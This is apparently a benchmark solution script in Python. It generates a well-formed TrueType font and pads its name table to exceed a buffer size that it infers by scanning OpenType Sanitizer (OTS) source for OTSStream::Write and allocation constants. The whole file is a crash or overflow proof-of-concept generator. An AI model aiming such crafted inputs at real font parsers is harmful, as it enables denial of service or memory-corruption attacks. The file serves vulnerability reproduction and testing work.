import io
import os
import re
import struct
import tarfile
from typing import Dict, List, Tuple


def _be16(x: int) -> bytes:
    return struct.pack(">H", x & 0xFFFF)


def _be16s(x: int) -> bytes:
    return struct.pack(">h", x)


def _be32(x: int) -> bytes:
    return struct.pack(">I", x & 0xFFFFFFFF)


def _pad4(b: bytes) -> bytes:
    if not b:
        return b
    return b + (b"\x00" * ((4 - (len(b) & 3)) & 3))


def _checksum_u32(data: bytes) -> int:
    d = _pad4(data)
    s = 0
    for i in range(0, len(d), 4):
        s = (s + struct.unpack(">I", d[i:i + 4])[0]) & 0xFFFFFFFF
    return s


def _sfnt_params(num_tables: int) -> Tuple[int, int, int]:
    power = 1
    entry_selector = 0
    while (power << 1) <= num_tables:
        power <<= 1
        entry_selector += 1
    search_range = power * 16
    range_shift = num_tables * 16 - search_range
    return search_range, entry_selector, range_shift


def _build_head(checksum_adjustment: int, index_to_loc_format: int = 0) -> bytes:
    # head table: 54 bytes
    version = 0x00010000
    font_revision = 0x00010000
    magic = 0x5F0F3CF5
    flags = 0x0003
    units_per_em = 1000
    created = 0
    modified = 0
    x_min = 0
    y_min = 0
    x_max = 0
    y_max = 0
    mac_style = 0
    lowest_rec_ppem = 8
    font_direction_hint = 2
    glyph_data_format = 0

    b = bytearray()
    b += _be32(version)
    b += _be32(font_revision)
    b += _be32(checksum_adjustment)
    b += _be32(magic)
    b += _be16(flags)
    b += _be16(units_per_em)
    b += struct.pack(">Q", created)
    b += struct.pack(">Q", modified)
    b += _be16s(x_min)
    b += _be16s(y_min)
    b += _be16s(x_max)
    b += _be16s(y_max)
    b += _be16(mac_style)
    b += _be16(lowest_rec_ppem)
    b += _be16s(font_direction_hint)
    b += _be16s(index_to_loc_format)
    b += _be16s(glyph_data_format)
    return bytes(b)


def _build_hhea(num_hmetrics: int = 1) -> bytes:
    # hhea: 36 bytes
    version = 0x00010000
    ascent = 800
    descent = -200
    line_gap = 0
    advance_width_max = 500
    min_lsb = 0
    min_rsb = 0
    x_max_extent = 0
    caret_slope_rise = 1
    caret_slope_run = 0
    caret_offset = 0
    metric_data_format = 0

    b = bytearray()
    b += _be32(version)
    b += _be16s(ascent)
    b += _be16s(descent)
    b += _be16s(line_gap)
    b += _be16(advance_width_max)
    b += _be16s(min_lsb)
    b += _be16s(min_rsb)
    b += _be16s(x_max_extent)
    b += _be16s(caret_slope_rise)
    b += _be16s(caret_slope_run)
    b += _be16s(caret_offset)
    b += _be16s(0) * 4  # reserved
    b += _be16s(metric_data_format)
    b += _be16(num_hmetrics)
    return bytes(b)


def _build_maxp(num_glyphs: int = 1) -> bytes:
    # maxp v1.0: 32 bytes total
    version = 0x00010000
    b = bytearray()
    b += _be32(version)
    b += _be16(num_glyphs)
    # 13 uint16 fields = 26 bytes
    b += _be16(0) * 13
    return bytes(b)


def _build_hmtx() -> bytes:
    # One long metric: advanceWidth (uint16), lsb (int16)
    return _be16(500) + _be16s(0)


def _build_glyf() -> bytes:
    # Single empty glyph (.notdef): numberOfContours=0, bbox=0
    return _be16s(0) + _be16s(0) + _be16s(0) + _be16s(0) + _be16s(0)


def _build_loca(glyf_len: int, short: bool = True) -> bytes:
    if short:
        if glyf_len & 1:
            glyf_len += 1
        return _be16(0) + _be16(glyf_len // 2)
    return _be32(0) + _be32(glyf_len)


def _build_post() -> bytes:
    # post format 3.0: 32 bytes
    return (
        _be32(0x00030000) +
        _be32(0) +            # italicAngle
        _be16s(0) +           # underlinePosition
        _be16s(0) +           # underlineThickness
        _be32(0) +            # isFixedPitch
        _be32(0) + _be32(0) + _be32(0) + _be32(0)  # memory usage fields
    )


def _build_cmap_format4_single_mapping(codepoint: int, glyph_id: int) -> bytes:
    # Minimal format 4 with 2 segments: one mapping segment + sentinel
    seg_count = 2
    seg_count_x2 = seg_count * 2
    search_range = 2 * (1 << (seg_count.bit_length() - 1)) * 2  # 2 * 2^floor(log2(segCount)) * 2
    entry_selector = seg_count.bit_length() - 1
    range_shift = seg_count_x2 - search_range

    end_code = [codepoint & 0xFFFF, 0xFFFF]
    start_code = [codepoint & 0xFFFF, 0xFFFF]
    # idDelta for mapping segment: (code + delta) % 65536 = glyph
    delta0 = (glyph_id - codepoint) & 0xFFFF
    id_delta = [delta0, 1]
    id_range_offset = [0, 0]

    length = 14 + (2 * seg_count) + 2 + (2 * seg_count) + (2 * seg_count) + (2 * seg_count)
    b = bytearray()
    b += _be16(4)              # format
    b += _be16(length)         # length
    b += _be16(0)              # language
    b += _be16(seg_count_x2)
    b += _be16(search_range)
    b += _be16(entry_selector)
    b += _be16(range_shift)
    for v in end_code:
        b += _be16(v)
    b += _be16(0)              # reservedPad
    for v in start_code:
        b += _be16(v)
    for v in id_delta:
        b += _be16(v)
    for v in id_range_offset:
        b += _be16(v)
    return bytes(b)


def _build_cmap() -> bytes:
    # cmap table with two encoding records pointing to one format 4 subtable
    subtable = _build_cmap_format4_single_mapping(0x0041, 0)
    version = 0
    num_tables = 2
    # header (4) + records (16) = 20 => subtable offset 20
    sub_offset = 4 + 8 * num_tables
    b = bytearray()
    b += _be16(version)
    b += _be16(num_tables)
    # platform 0, encoding 3 (Unicode BMP)
    b += _be16(0) + _be16(3) + _be32(sub_offset)
    # platform 3, encoding 1 (Windows Unicode BMP)
    b += _be16(3) + _be16(1) + _be32(sub_offset)
    b += subtable
    return bytes(b)


def _build_name(name_utf16be: bytes) -> bytes:
    # name format 0 with one Windows Unicode record
    # stringOffset = 6 + 12*count
    count = 1
    string_offset = 6 + 12 * count
    platform_id = 3
    encoding_id = 1
    language_id = 0x0409
    name_id = 1
    length = len(name_utf16be)
    offset = 0

    b = bytearray()
    b += _be16(0)  # format
    b += _be16(count)
    b += _be16(string_offset)
    b += _be16(platform_id)
    b += _be16(encoding_id)
    b += _be16(language_id)
    b += _be16(name_id)
    b += _be16(length)
    b += _be16(offset)
    b += name_utf16be
    return bytes(b)


def _assemble_sfnt(tables: Dict[bytes, bytes]) -> bytes:
    tags = sorted(tables.keys())
    num_tables = len(tags)
    search_range, entry_selector, range_shift = _sfnt_params(num_tables)

    # compute table records with offsets
    offset = 12 + 16 * num_tables
    records = []
    table_data_chunks = []

    for tag in tags:
        data = tables[tag]
        length = len(data)
        csum = _checksum_u32(data)
        records.append((tag, csum, offset, length))
        pdata = _pad4(data)
        table_data_chunks.append(pdata)
        offset += len(pdata)

    out = bytearray()
    out += _be32(0x00010000)  # sfnt version
    out += _be16(num_tables)
    out += _be16(search_range)
    out += _be16(entry_selector)
    out += _be16(range_shift)

    for tag, csum, off, length in records:
        out += tag
        out += _be32(csum)
        out += _be32(off)
        out += _be32(length)

    for chunk in table_data_chunks:
        out += chunk

    return bytes(out)


def _set_head_checksum_adjustment(sfnt: bytes, head_offset: int) -> bytes:
    # sfnt length should be multiple of 4 already; pad for checksum calc anyway
    total_checksum = _checksum_u32(sfnt)
    adj = (0xB1B0AFBA - total_checksum) & 0xFFFFFFFF
    b = bytearray(sfnt)
    # head table layout: checkSumAdjustment at offset 8 within head
    b[head_offset + 8: head_offset + 12] = _be32(adj)
    return bytes(b)


def _parse_head_offset(sfnt: bytes) -> int:
    # locate head table from directory
    if len(sfnt) < 12:
        return -1
    num_tables = struct.unpack(">H", sfnt[4:6])[0]
    dir_off = 12
    for i in range(num_tables):
        e = dir_off + i * 16
        tag = sfnt[e:e + 4]
        off = struct.unpack(">I", sfnt[e + 8:e + 12])[0]
        if tag == b"head":
            return off
    return -1


def _recompute_head_directory_checksum(sfnt: bytes) -> bytes:
    # recompute head table checksum in directory after updating adjustment
    num_tables = struct.unpack(">H", sfnt[4:6])[0]
    dir_off = 12
    b = bytearray(sfnt)
    for i in range(num_tables):
        e = dir_off + i * 16
        tag = b[e:e + 4]
        off = struct.unpack(">I", b[e + 8:e + 12])[0]
        length = struct.unpack(">I", b[e + 12:e + 16])[0]
        if tag == b"head":
            head_data = bytes(b[off:off + length])
            csum = _checksum_u32(head_data)
            b[e + 4:e + 8] = _be32(csum)
            break
    return bytes(b)


def _build_ttf_with_target_len(target_len: int) -> bytes:
    glyf = _build_glyf()
    loca = _build_loca(len(glyf), short=True)
    head = _build_head(0, index_to_loc_format=0)
    hhea = _build_hhea(num_hmetrics=1)
    maxp = _build_maxp(num_glyphs=1)
    hmtx = _build_hmtx()
    cmap = _build_cmap()
    post = _build_post()

    fixed_tables = {
        b"cmap": cmap,
        b"glyf": glyf,
        b"head": head,
        b"hhea": hhea,
        b"hmtx": hmtx,
        b"loca": loca,
        b"maxp": maxp,
        b"post": post,
    }

    # Determine base length excluding name data, by assembling with minimal name
    name_min = _build_name("A".encode("utf-16-be"))
    tables_min = dict(fixed_tables)
    tables_min[b"name"] = name_min
    sfnt_min = _assemble_sfnt(tables_min)

    # Find head offset in the assembled font (stable w.r.t. name length)
    head_off = _parse_head_offset(sfnt_min)
    if head_off < 0:
        head_off = 0

    # Now compute needed name length to reach target_len
    # We will adjust by increasing name string length until final assembled length >= target_len.
    # Use the fact that only name table changes length.
    # Avoid too many iterations: compute starting guess.
    fixed_without_name = dict(fixed_tables)
    # Assemble without name to compute base; approximate by replacing name with empty minimal structure
    # But name needs at least 1 record; so compute using minimal name and adjust.
    base_len = len(sfnt_min)  # includes minimal name
    if base_len >= target_len:
        name_chars = 1
    else:
        # Each extra char adds 2 bytes, but due to 4-byte padding it may add 0/4 sometimes.
        # Start with an estimate.
        delta = target_len - base_len
        name_chars = 1 + (delta + 1) // 2

    # Cap to avoid pathological sizes
    if name_chars > 200000:
        name_chars = 200000

    def assemble_with_chars(nchars: int) -> bytes:
        name_utf16 = (b"\x00A" * nchars)
        name_tbl = _build_name(name_utf16)
        t = dict(fixed_tables)
        t[b"name"] = name_tbl
        return _assemble_sfnt(t)

    # Refine to minimal >= target_len
    sfnt = assemble_with_chars(name_chars)
    while len(sfnt) < target_len and name_chars < 200000:
        # jump faster if far
        remaining = target_len - len(sfnt)
        step = max(1, min(8192, (remaining + 1) // 2))
        name_chars = min(200000, name_chars + step)
        sfnt = assemble_with_chars(name_chars)

    # Now walk back to find minimal meeting target
    while name_chars > 1:
        prev_chars = max(1, name_chars - 1)
        prev_sfnt = assemble_with_chars(prev_chars)
        if len(prev_sfnt) >= target_len:
            name_chars = prev_chars
            sfnt = prev_sfnt
        else:
            break

    # Patch checksum adjustment
    head_off = _parse_head_offset(sfnt)
    if head_off < 0:
        return sfnt
    patched = _set_head_checksum_adjustment(sfnt, head_off)
    patched = _recompute_head_directory_checksum(patched)
    return patched


class Solution:
    def _infer_target_len(self, src_path: str) -> int:
        default_target = 1200
        candidates: List[int] = []

        if not src_path or not os.path.exists(src_path):
            return default_target

        try:
            with tarfile.open(src_path, "r:*") as tf:
                members = tf.getmembers()
                # Prefer smaller subset to scan quickly
                for m in members:
                    if not m.isfile():
                        continue
                    name = m.name
                    if not (name.endswith((".cc", ".cpp", ".c", ".h", ".hpp"))):
                        continue
                    if m.size <= 0 or m.size > 2_000_000:
                        continue
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    data = f.read(300_000)
                    try:
                        s = data.decode("utf-8", "ignore")
                    except Exception:
                        continue
                    if ("OTSStream" not in s) or ("Write" not in s):
                        continue
                    if ("OTSStream::Write" not in s) and ("Write(" not in s):
                        continue

                    for mm in re.finditer(r'\b(k(?:Initial|Default|Buffer)\w*(?:Size|Capacity)|buffer\w*|capacity\w*|initial\w*)\s*(?:=|:)\s*(\d{2,6})\b', s):
                        v = int(mm.group(2))
                        if 64 <= v <= 8192:
                            candidates.append(v)

                    for pat in [
                        r'\breserve\s*\(\s*(\d{2,6})\s*\)',
                        r'\bresize\s*\(\s*(\d{2,6})\s*\)',
                        r'\bnew\s+\w+\s*\[\s*(\d{2,6})\s*\]',
                        r'\bmalloc\s*\(\s*(\d{2,6})\s*\)',
                        r'\bcalloc\s*\(\s*(\d{2,6})\s*,\s*(\d{1,6})\s*\)',
                    ]:
                        for mm in re.finditer(pat, s):
                            if pat.startswith(r'\bcalloc'):
                                a = int(mm.group(1))
                                b = int(mm.group(2))
                                v = a * b
                            else:
                                v = int(mm.group(1))
                            if 64 <= v <= 8192:
                                candidates.append(v)

                    for mm in re.finditer(r'\b(\d{1,4})\s*\*\s*1024\b', s):
                        v = int(mm.group(1)) * 1024
                        if 64 <= v <= 8192:
                            candidates.append(v)
                    for mm in re.finditer(r'\b1024\s*\*\s*(\d{1,4})\b', s):
                        v = int(mm.group(1)) * 1024
                        if 64 <= v <= 8192:
                            candidates.append(v)
        except Exception:
            return default_target

        if candidates:
            cap = max(candidates)
            target = max(420, cap + 64)
            # Keep within reasonable bounds
            if target < 600:
                target = 600
            if target > 8192:
                target = 8192
            return target

        return default_target

    def solve(self, src_path: str) -> bytes:
        target_len = self._infer_target_len(src_path)
        return _build_ttf_with_target_len(target_len)